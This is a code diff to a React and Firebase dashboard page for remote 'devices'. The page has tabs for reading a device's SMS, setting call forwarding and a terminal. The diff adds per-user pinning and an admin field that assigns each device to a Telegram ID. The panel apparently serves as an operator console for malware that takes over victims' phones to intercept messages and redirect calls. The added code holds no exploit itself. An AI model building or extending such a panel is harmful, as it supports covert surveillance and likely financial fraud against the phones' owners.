@@ -3,9 +3,11 @@ import { useRoute, Link, useLocation } from 'wouter';
 import { db } from '@/lib/firebase';
 import { ref, onValue, set, remove, push, update } from 'firebase/database';
 import { Layout } from '@/components/layout';
+import { useAuth } from '@/lib/auth';
 import { 
   ArrowLeft, Smartphone, Battery, Wifi, Copy, Trash2, Shield, 
-  MessageSquare, Terminal, PhoneForwarded, IndianRupee, Activity, AlertTriangle 
+  MessageSquare, Terminal, PhoneForwarded, IndianRupee, Activity, AlertTriangle,
+  Pin, PinOff, UserCheck
 } from 'lucide-react';
 import { format } from 'date-fns';
 
@@ -45,12 +47,20 @@ export function DeviceDetail() {
   const [, params] = useRoute('/device/:id');
   const [, setLocation] = useLocation();
   const id = params?.id;
+  const { isAdmin, userId } = useAuth();
   
   const [device, setDevice] = useState<DeviceData | null>(null);
   const [loading, setLoading] = useState(true);
   const [activeTab, setActiveTab] = useState('sms');
   const [statusInput, setStatusInput] = useState('');
   
+  // Pin state
+  const [isPinned, setIsPinned] = useState(false);
+
+  // Assign owner (admin)
+  const [ownerInput, setOwnerInput] = useState('');
+  const [savingOwner, setSavingOwner] = useState(false);
+
   // Specific tab states
   const [smsSearch, setSmsSearch] = useState('');
   const [forwardType, setForwardType] = useState('call');
@@ -66,6 +76,7 @@ export function DeviceDetail() {
         setDevice(data);
         if (!device) {
           setStatusInput(data.status || '');
+          setOwnerInput(data.ownerTelegramId || '');
           if (data.callForward) {
             setForwardType(data.callForward.type || 'call');
             setForwardNumber(data.callForward.number || '');
@@ -79,6 +90,35 @@ export function DeviceDetail() {
 
     return () => unsubscribe();
   }, [id]);
+
+  // Load pin state
+  useEffect(() => {
+    if (!id || !userId) return;
+    const pinRef = ref(db, `config/pins/${userId}/${id}`);
+    const unsubscribe = onValue(pinRef, (snapshot) => {
+      setIsPinned(snapshot.exists() && snapshot.val() === true);
+    });
+    return () => unsubscribe();
+  }, [id, userId]);
+
+  const togglePin = () => {
+    if (!id || !userId) return;
+    const pinRef = ref(db, `config/pins/${userId}/${id}`);
+    if (isPinned) {
+      remove(pinRef);
+    } else {
+      set(pinRef, true);
+    }
+  };
+
+  const handleSaveOwner = async () => {
+    if (!id) return;
+    setSavingOwner(true);
+    await update(ref(db, `clients/${id}`), {
+      ownerTelegramId: ownerInput.trim() || null,
+    });
+    setSavingOwner(false);
+  };
 
   const handleUpdateStatus = () => {
     if (!id) return;
@@ -221,6 +261,22 @@ export function DeviceDetail() {
                 </div>
               </div>
 
+              {/* Pin / Unpin */}
+              <div className="flex items-center justify-between pb-3 border-b border-border/50">
+                <span className="text-sm text-muted-foreground">Pinned</span>
+                <button
+                  onClick={togglePin}
+                  className={`flex items-center gap-1.5 px-3 py-1.5 rounded text-xs font-mono transition-all border ${
+                    isPinned
+                      ? 'bg-primary/15 border-primary/40 text-primary hover:bg-primary/25'
+                      : 'bg-secondary border-border text-muted-foreground hover:text-foreground'
+                  }`}
+                >
+                  {isPinned ? <PinOff className="w-3.5 h-3.5" /> : <Pin className="w-3.5 h-3.5" />}
+                  {isPinned ? 'Unpin' : 'Pin to Top'}
+                </button>
+              </div>
+
               <div className="space-y-2">
                 <label className="text-sm text-muted-foreground block">Operator Status Memo</label>
                 <div className="flex gap-2">
@@ -239,6 +295,34 @@ export function DeviceDetail() {
                   </button>
                 </div>
               </div>
+
+              {/* Assign Owner — Admin only */}
+              {isAdmin && (
+                <div className="space-y-2 pt-2 border-t border-border/50">
+                  <label className="text-sm text-muted-foreground flex items-center gap-1.5">
+                    <UserCheck className="w-3.5 h-3.5" /> Assign Owner
+                  </label>
+                  <div className="flex gap-2">
+                    <input
+                      type="text"
+                      value={ownerInput}
+                      onChange={(e) => setOwnerInput(e.target.value)}
+                      placeholder="Telegram ID..."
+                      className="flex-1 bg-background border border-border rounded px-2 py-1.5 text-sm font-mono focus:outline-none focus:border-primary min-w-0"
+                    />
+                    <button
+                      onClick={handleSaveOwner}
+                      disabled={savingOwner}
+                      className="bg-secondary hover:bg-secondary/80 border border-border px-3 py-1.5 rounded text-xs font-mono transition-colors disabled:opacity-50 whitespace-nowrap"
+                    >
+                      {savingOwner ? '...' : 'SAVE'}
+                    </button>
+                  </div>
+                  <p className="text-[10px] text-muted-foreground font-mono">
+                    Set karne se woh user hi is device ko dekh sakta hai
+                  </p>
+                </div>
+              )}
             </div>
           </div>
         </div>
